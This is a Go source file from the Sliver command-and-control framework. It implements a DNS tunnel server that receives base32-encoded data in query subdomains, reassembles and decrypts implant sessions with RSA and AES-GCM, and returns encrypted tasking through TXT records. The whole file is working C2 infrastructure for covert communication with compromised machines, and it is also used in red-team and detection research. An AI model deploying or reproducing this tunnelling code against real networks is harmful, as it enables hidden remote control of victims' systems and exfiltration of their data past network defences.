package c2

/*
	DNS Tunnel Implementation
*/

import (
	"crypto/sha256"
	"crypto/x509"
	"math"
	"sliver/server/assets"
	"sort"

	"encoding/base32"
	"encoding/base64"
	"encoding/binary"
	"encoding/pem"

	"errors"
	"fmt"
	"log"
	insecureRand "math/rand"
	pb "sliver/protobuf/sliver"
	"sliver/server/certs"
	"sliver/server/core"
	"sliver/server/cryptography"
	"strconv"
	"strings"
	"sync"
	"time"

	serverHandlers "sliver/server/handlers"

	"github.com/golang/protobuf/proto"
	"github.com/miekg/dns"
)

const (
	sessionIDSize = 12

	domainKeyMsg  = "_domainkey"
	blockReqMsg   = "b"
	clearBlockMsg = "cb"

	sessionInitMsg     = "si"
	sessionPollingMsg  = "sp"
	sessionEnvelopeMsg = "se"

	// Max TXT record is 255, records are b64 so (n*8 + 5) / 6 = ~250
	byteBlockSize = 185 // Can be as high as n = 187, but we'll leave some slop
	blockIDSize   = 6
)

var (
	dnsCharSet = []rune("abcdefghijklmnopqrstuvwxyz0123456789-_")

	sendBlocksMutex = &sync.RWMutex{}
	sendBlocks      = &map[string]*SendBlock{}

	dnsSessionsMutex = &sync.RWMutex{}
	dnsSessions      = &map[string]*DNSSession{}

	blockReassemblerMutex = &sync.RWMutex{}
	blockReassembler      = &map[string][][]byte{}

	dnsSegmentReassemblerMutex = &sync.RWMutex{}
	dnsSegmentReassembler      = &map[string](*map[int][]string){}
)

// SendBlock - Data is encoded and split into `Blocks`
type SendBlock struct {
	ID   string
	Data []string
}

// DNSSession - Holds DNS session information
type DNSSession struct {
	ID          string
	Sliver      *core.Sliver
	Key         cryptography.AESKey
	LastCheckin time.Time
	replay      map[string]bool // Sessions are mutex'd
}

func (s *DNSSession) isReplayAttack(ciphertext []byte) bool {
	sha := sha256.New()
	sha.Write(ciphertext)
	digest := base64.RawStdEncoding.EncodeToString(sha.Sum(nil))
	if _, ok := s.replay[digest]; ok {
		return true
	}
	s.replay[digest] = true
	return false
}

// --------------------------- DNS SERVER ---------------------------

// StartDNSListener - Start a DNS listener
func StartDNSListener(domain string) *dns.Server {

	log.Printf("Starting DNS listener for '%s' ...", domain)

	dns.HandleFunc(".", func(writer dns.ResponseWriter, req *dns.Msg) {
		handleDNSRequest(domain, writer, req)
	})

	server := &dns.Server{Addr: ":53", Net: "udp"}
	return server
}

func handleDNSRequest(domain string, writer dns.ResponseWriter, req *dns.Msg) {

	if len(req.Question) < 1 {
		log.Printf("No questions in DNS request")
		return
	}

	if !dns.IsSubDomain(domain, req.Question[0].Name) {
		log.Printf("Ignoring DNS req, '%s' is not a child of '%s'", req.Question[0].Name, domain)
		return
	}
	subdomain := req.Question[0].Name[:len(req.Question[0].Name)-len(domain)]
	if strings.HasSuffix(subdomain, ".") {
		subdomain = subdomain[:len(subdomain)-1]
	}
	log.Printf("[dns] processing req for subdomain = %s", subdomain)

	resp := &dns.Msg{}
	switch req.Question[0].Qtype {
	case dns.TypeTXT:
		resp = handleTXT(domain, subdomain, req)
	default:
	}

	writer.WriteMsg(resp)
}

func handleTXT(domain string, subdomain string, req *dns.Msg) *dns.Msg {

	q := req.Question[0]
	fields := strings.Split(subdomain, ".")
	resp := new(dns.Msg)
	resp.SetReply(req)
	msgType := fields[len(fields)-1]

	switch msgType {

	case domainKeyMsg: // Send PubKey -  _(nonce).(slivername).domainkey.example.com
		result, err := getDomainKeyFor(domain)
		if err != nil {
			log.Printf("Error during session init: %v", err)
		}
		txt := &dns.TXT{
			Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 0},
			Txt: result,
		}
		resp.Answer = append(resp.Answer, txt)

	case blockReqMsg: // Get block: _(nonce).(start).(stop).(block id).b.example.com
		if len(fields) == 5 {
			startIndex := fields[1]
			stopIndex := fields[2]
			blockID := fields[3]
			txt := &dns.TXT{
				Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 0},
				Txt: dnsSendBlocks(blockID, startIndex, stopIndex),
			}
			resp.Answer = append(resp.Answer, txt)
		} else {
			log.Printf("Block request has invalid number of fields %d expected %d", len(fields), 5)
		}

	case clearBlockMsg: // Clear block: _(nonce).(block id)._cb.example.com
		if len(fields) == 3 {
			result := 0
			if clearSendBlock(fields[1]) {
				result = 1
			}
			txt := &dns.TXT{
				Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 0},
				Txt: []string{fmt.Sprintf("%d", result)},
			}
			resp.Answer = append(resp.Answer, txt)
		}

	case "_" + sessionInitMsg:
		fallthrough
	case sessionInitMsg: // Session init: (data)...(seq).(nonce).(_)si.example.com
		result, err := startDNSSession(domain, fields)
		if err != nil {
			log.Printf("Error during session init: %v", err)
		}
		txt := &dns.TXT{
			Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 0},
			Txt: result,
		}
		resp.Answer = append(resp.Answer, txt)

	case "_" + sessionEnvelopeMsg:
		fallthrough
	case sessionEnvelopeMsg:
		result, err := dnsSessionEnvelope(domain, fields)
		if err != nil {
			log.Printf("Error during session init: %v", err)
		}
		txt := &dns.TXT{
			Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 0},
			Txt: result,
		}
		resp.Answer = append(resp.Answer, txt)

	case sessionPollingMsg:
		result, err := dnsSessionPoll(domain, fields)
		if err != nil {
			log.Printf("Error during session init: %v", err)
		}
		txt := &dns.TXT{
			Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 0},
			Txt: result,
		}
		resp.Answer = append(resp.Answer, txt)

	default:
		log.Printf("Unknown msg type '%s' in TXT req", fields[len(fields)-1])
	}

	// log.Println("\n" + strings.Repeat("-", 40) + "\n" + resp.String() + "\n" + strings.Repeat("-", 40))

	return resp
}

// --------------------------- FIELDS ---------------------------

func getFieldMsgType(fields []string) (string, error) {
	if len(fields) < 1 {
		return "", errors.New("Invalid number of fields in session init message (nounce)")
	}
	return fields[len(fields)-1], nil
}

func getFieldSessionID(fields []string) (string, error) {
	if len(fields) < 2 {
		return "", errors.New("Invalid number of fields in session init message (session id)")
	}
	sessionID := fields[len(fields)-2]
	if sessionID == "_" {
		return "", errors.New("Session ID is null")
	}
	return sessionID, nil
}

func getFieldNonce(fields []string) (string, error) {
	if len(fields) < 3 {
		return "", errors.New("Invalid number of fields in session init message (nounce)")
	}
	return fields[len(fields)-3], nil
}

func getFieldSeq(fields []string) (int, error) {
	if len(fields) < 4 {
		return -1, errors.New("Invalid number of fields in session init message (seq)")
	}
	rawSeq := fields[len(fields)-4]
	data, err := dnsDecodeString(rawSeq)
	if err != nil {
		log.Printf("Failed to decode seq field: %#v", rawSeq)
		return 0, err
	}
	index := int(binary.LittleEndian.Uint32(data))

	return index, nil
}

func getFieldSubdata(fields []string) ([]string, error) {
	if len(fields) < 5 {
		return []string{}, errors.New("Invalid number of fields in session init message (subdata)")
	}
	subdataFields := len(fields) - 4
	log.Printf("Domain contains %d subdata fields", subdataFields)
	return fields[:subdataFields], nil
}

// --------------------------- DNS SESSION START ---------------------------

// Returns an confirmation value (e.g. exit code 0 non-0) and error
func startDNSSession(domain string, fields []string) ([]string, error) {
	log.Printf("[start session] fields = %#v", fields)

	msgType, err := getFieldMsgType(fields)
	if err != nil {
		return []string{"1"}, err
	}

	nonce, err := getFieldNonce(fields)
	if err != nil {
		return []string{"1"}, err
	}

	if !strings.HasPrefix(msgType, "_") {
		return dnsSegment(fields)
	}
	log.Printf("Complete session init message received, reassembling ...")

	// TODO: We don't have replay protection against the RSA-encrypt
	// sessionInit messages, but I don't think it's an issue ...
	encryptedSessionInit, err := dnsSegmentReassemble(nonce)
	if err != nil {
		return []string{"1"}, err
	}

	rootDir := assets.GetRootAppDir()
	publicKeyPEM, privateKeyPEM, err := certs.GetServerRSACertificatePEM(rootDir, "slivers", domain, false)
	if err != nil {
		log.Printf("Failed to fetch rsa private key")
		return []string{"1"}, err
	}
	publicKeyBlock, _ := pem.Decode([]byte(publicKeyPEM))
	log.Printf("RSA Fingerprint: %s", fingerprintSHA256(publicKeyBlock))
	privateKeyBlock, _ := pem.Decode([]byte(privateKeyPEM))
	privateKey, _ := x509.ParsePKCS1PrivateKey(privateKeyBlock.Bytes)

	sessionInitData, err := cryptography.RSADecrypt(encryptedSessionInit, privateKey)
	if err != nil {
		log.Printf("Failed to decrypt session init msg")
		return []string{"1"}, err
	}

	sessionInit := &pb.DNSSessionInit{}
	proto.Unmarshal(sessionInitData, sessionInit)

	log.Printf("Received new session in request")

	sliver := &core.Sliver{
		ID:            core.GetHiveID(),
		Transport:     "dns",
		RemoteAddress: "n/a",
		Send:          make(chan *pb.Envelope, 16),
		RespMutex:     &sync.RWMutex{},
		Resp:          map[string]chan *pb.Envelope{},
	}

	core.Hive.AddSliver(sliver)

	aesKey, _ := cryptography.AESKeyFromBytes(sessionInit.Key)
	sessionID := dnsSessionID()
	log.Printf("Starting new DNS session with id = %s", sessionID)
	dnsSessionsMutex.Lock()
	(*dnsSessions)[sessionID] = &DNSSession{
		ID:          sessionID,
		Sliver:      sliver,
		Key:         aesKey,
		LastCheckin: time.Now(),
		replay:      map[string]bool{},
	}
	dnsSessionsMutex.Unlock()

	encryptedSessionID, _ := cryptography.GCMEncrypt(aesKey, []byte(sessionID))
	result, err := dnsSendOnce(encryptedSessionID)
	if err != nil {
		log.Printf("Failed to encode message into single result %v", err)
		return []string{"1"}, err
	}

	return result, nil
}

// --------------------------- DNS SESSION RECV ---------------------------

func dnsSessionEnvelope(domain string, fields []string) ([]string, error) {
	log.Printf("[session envelope] fields = %#v", fields)

	msgType, err := getFieldMsgType(fields)
	if err != nil {
		return []string{"1"}, err
	}

	nonce, err := getFieldNonce(fields)
	if err != nil {
		return []string{"1"}, err
	}

	if !strings.HasPrefix(msgType, "_") {
		return dnsSegment(fields)
	}
	log.Printf("Complete envelope received, reassembling ...")
	encryptedDNSEnvelope, err := dnsSegmentReassemble(nonce)
	if err != nil {
		return []string{"1"}, errors.New("Failed to reassemble segments")
	}

	sessionID, err := getFieldSessionID(fields)
	if err != nil {
		return []string{"1"}, err
	}
	dnsSessionsMutex.Lock()
	defer dnsSessionsMutex.Unlock()

	if dnsSession, ok := (*dnsSessions)[sessionID]; ok {
		log.Printf("Envelope has valid DNS session (%s)", dnsSession.ID)
		envelopeData, err := cryptography.GCMDecrypt(dnsSession.Key, encryptedDNSEnvelope)
		if err != nil {
			return []string{"1"}, errors.New("Failed to decrypt DNS envelope")
		}
		envelope := &pb.Envelope{}
		proto.Unmarshal(envelopeData, envelope)

		log.Printf("Envelope Type = %#v RespID = %#v", envelope.Type, envelope.Id)

		// Response Envelope or Handler
		handlers := serverHandlers.GetSliverHandlers()
		if envelope.Id != "" {
			dnsSession.Sliver.RespMutex.Lock()
			defer dnsSession.Sliver.RespMutex.Unlock()
			if resp, ok := dnsSession.Sliver.Resp[envelope.Id]; ok {
				resp <- envelope
			}
		} else if handler, ok := handlers[envelope.Type]; ok {
			handler.(func(*core.Sliver, []byte))(dnsSession.Sliver, envelope.Data)
		}
		return []string{"0"}, nil
	}
	log.Printf("Invalid session id '%#v'", sessionID)
	return []string{"1"}, errors.New("Invalid session ID")
}

// Client should have sent all of the data, attempt to reassemble segments
func dnsSegmentReassemble(nonce string) ([]byte, error) {
	dnsSegmentReassemblerMutex.Lock()
	defer dnsSegmentReassemblerMutex.Unlock()
	if reasm, ok := (*dnsSegmentReassembler)[nonce]; ok {
		var keys []int
		for k := range *reasm {
			keys = append(keys, k)
		}
		sort.Ints(keys)
		orderedSubdata := []string{}
		for _, k := range keys {
			orderedSubdata = append(orderedSubdata, (*reasm)[k]...)
		}
		data, err := dnsDecodeString(strings.Join(orderedSubdata, ""))
		if err != nil {
			log.Printf("Failed to decode session init: %v", err)
			return nil, err
		}
		delete((*dnsSegmentReassembler), nonce)
		return data, nil
	}
	return nil, fmt.Errorf("Invalid nonce '%#v' (session init reassembler)", nonce)
}

// The domain is only a segment of the startDNSSession message, so we just store the data
func dnsSegment(fields []string) ([]string, error) {
	dnsSegmentReassemblerMutex.Lock()
	defer dnsSegmentReassemblerMutex.Unlock()

	nonce, _ := getFieldNonce(fields)
	index, err := getFieldSeq(fields)
	if err != nil {
		return []string{"1"}, err
	}
	subdata, err := getFieldSubdata(fields)
	if err != nil {
		return []string{"1"}, err
	}
	if _, ok := (*dnsSegmentReassembler)[nonce]; !ok {
		(*dnsSegmentReassembler)[nonce] = &map[int][]string{}
	}
	if reasm, ok := (*dnsSegmentReassembler)[nonce]; ok {
		(*reasm)[index] = subdata
		return []string{"0"}, nil
	}
	log.Printf("Invalid nonce (session segment): %#v", nonce)
	return []string{"1"}, errors.New("Invalid nonce (session segment)")
}

func getDomainKeyFor(domain string) ([]string, error) {
	rootDir := assets.GetRootAppDir()
	certPEM, _, _ := certs.GetServerRSACertificatePEM(rootDir, "slivers", domain, false)
	return dnsSendOnce(certPEM)
}

// --------------------------- DNS SESSION SEND ---------------------------

// Send all response data in a single TXT record, limited to 65535 bytes
func dnsSendOnce(rawData []byte) ([]string, error) {
	if 65535 <= base64.RawStdEncoding.EncodedLen(len(rawData)) {
		return nil, errors.New("Response too large to encode into one TXT record")
	}
	data := base64.RawStdEncoding.EncodeToString(rawData)
	log.Printf("Encoding single resp: %#v", data)
	txts := []string{}
	size := int(math.Ceil(float64(len(data)) / 255.0))
	for index := 0; index < size; index++ {
		start := index * 255
		stop := start + 255
		if len(data) < stop {
			stop = len(data)
		}
		txts = append(txts, data[start:stop])
	}
	return txts, nil
}

func dnsSessionPoll(domain string, fields []string) ([]string, error) {

	sessionID, err := getFieldSessionID(fields)
	if err != nil {
		return []string{"1"}, errors.New("invalid session id (session poll)")
	}
	dnsSessionsMutex.Lock()
	dnsSession := (*dnsSessions)[sessionID]
	dnsSessionsMutex.Unlock()

	isDrained := false
	envelopes := []*pb.Envelope{}
	for !isDrained {
		select {
		case envelope := <-dnsSession.Sliver.Send:
			log.Printf("New message from send channel ...")
			envelopes = append(envelopes, envelope)
		default:
			isDrained = true
		}
	}

	if 0 < len(envelopes) {
		log.Printf("%d new message(s) for session id %#v", len(envelopes), sessionID)
		dnsPoll := &pb.DNSPoll{}
		for _, envelope := range envelopes {
			data, err := proto.Marshal(envelope)
			if err != nil {
				log.Printf("Failed to encode envelope %v", err)
				continue
			}

			encryptedEnvelopeData, err := cryptography.GCMEncrypt(dnsSession.Key, data)
			if err != nil {
				log.Printf("Failed to encrypt poll data %v", err)
				return []string{"1"}, errors.New("Failed to encrypt dns poll data")
			}

			blockID, size := storeSendBlocks(encryptedEnvelopeData)
			dnsPoll.Blocks = append(dnsPoll.Blocks, &pb.DNSBlockHeader{
				Id:   blockID,
				Size: uint32(size),
			})
		}
		pollData, err := proto.Marshal(dnsPoll)
		if err != nil {
			log.Printf("Failed to encode envelope %v", err)
			return []string{"1"}, errors.New("Failed to encode dns poll data")
		}
		encryptedPollData, err := cryptography.GCMEncrypt(dnsSession.Key, pollData)
		if err != nil {
			log.Printf("Failed to encrypt poll data %v", err)
			return []string{"1"}, errors.New("Failed to encrypt dns poll data")
		}
		return dnsSendOnce(encryptedPollData)
	}
	log.Printf("No new message for session id %#v", sessionID)
	return []string{"0"}, nil
}

// Send blocks of data via multiple DNS TXT responses
func dnsSendBlocks(blockID string, startIndex string, stopIndex string) []string {
	start, err := strconv.Atoi(startIndex)
	if err != nil {
		return []string{}
	}
	stop, err := strconv.Atoi(stopIndex)
	if err != nil {
		return []string{}
	}

	if stop < start {
		return []string{}
	}

	log.Printf("Send blocks %d to %d for ID %s", start, stop, blockID)

	sendBlocksMutex.Lock()
	defer sendBlocksMutex.Unlock()
	respBlocks := []string{}
	if block, ok := (*sendBlocks)[blockID]; ok {
		for index := start; index < stop; index++ {
			if index < len(block.Data) {
				respBlocks = append(respBlocks, block.Data[index])
			}
		}
		log.Printf("Sending %d response block(s)", len(respBlocks))
		return respBlocks
	}
	log.Printf("Invalid block ID: %#v", blockID)
	return []string{}
}

// Clear send blocks of data from memory
func clearSendBlock(blockID string) bool {
	sendBlocksMutex.Lock()
	defer sendBlocksMutex.Unlock()
	if _, ok := (*sendBlocks)[blockID]; ok {
		delete(*sendBlocks, blockID)
		return true
	}
	return false
}

// Stores encoded blocks fo data into "sendBlocks"
func storeSendBlocks(data []byte) (string, int) {
	blockID := generateBlockID()

	sendBlock := &SendBlock{
		ID:   blockID,
		Data: []string{},
	}
	for index := 0; index < len(data); index += byteBlockSize {
		start := index
		stop := index + byteBlockSize
		if len(data) < stop {
			stop = len(data)
		}
		encoded := base64.RawStdEncoding.EncodeToString(data[start:stop])
		log.Printf("Encoded block is %d bytes", len(encoded))
		sendBlock.Data = append(sendBlock.Data, encoded)
	}
	sendBlocksMutex.Lock()
	(*sendBlocks)[sendBlock.ID] = sendBlock
	sendBlocksMutex.Unlock()
	return sendBlock.ID, len(sendBlock.Data)
}

// --------------------------- HELPERS ---------------------------

// Unique IDs, no need for secure random
func generateBlockID() string {
	insecureRand.Seed(time.Now().UnixNano())
	blockID := []rune{}
	for i := 0; i < blockIDSize; i++ {
		index := insecureRand.Intn(len(dnsCharSet))
		blockID = append(blockID, dnsCharSet[index])
	}
	return string(blockID)
}

func fingerprintSHA256(block *pem.Block) string {
	hash := sha256.Sum256(block.Bytes)
	b64hash := base64.RawStdEncoding.EncodeToString(hash[:])
	return strings.TrimRight(b64hash, "=")
}

// --------------------------- ENCODER ---------------------------

const base32Alphabet = "0123456789abcdefghjkmnpqrtuvwxyz"

var sliverBase32 = base32.NewEncoding(base32Alphabet)

// EncodeToString encodes the given byte slice in base32
func dnsEncodeToString(input []byte) string {
	return strings.TrimRight(sliverBase32.EncodeToString(input), "=")
}

// DecodeString decodes the given base32 encodeed bytes
func dnsDecodeString(raw string) ([]byte, error) {
	pad := 8 - (len(raw) % 8)
	padded := []byte(raw)
	if pad != 8 {
		padded = make([]byte, len(raw)+pad)
		copy(padded, raw)
		for index := 0; index < pad; index++ {
			padded[len(raw)+index] = '='
		}
	}
	// log.Printf("[base32] %#v", string(padded))
	return sliverBase32.DecodeString(string(padded))
}

// SessionIDs are public parameters in this use case
// so it's only important that they're unique
func dnsSessionID() string {
	insecureRand.Seed(time.Now().UnixNano())
	sessionID := []rune{}
	for i := 0; i < sessionIDSize; i++ {
		index := insecureRand.Intn(len(dnsCharSet))
		sessionID = append(sessionID, dnsCharSet[index])
	}
	return "_" + string(sessionID)
}
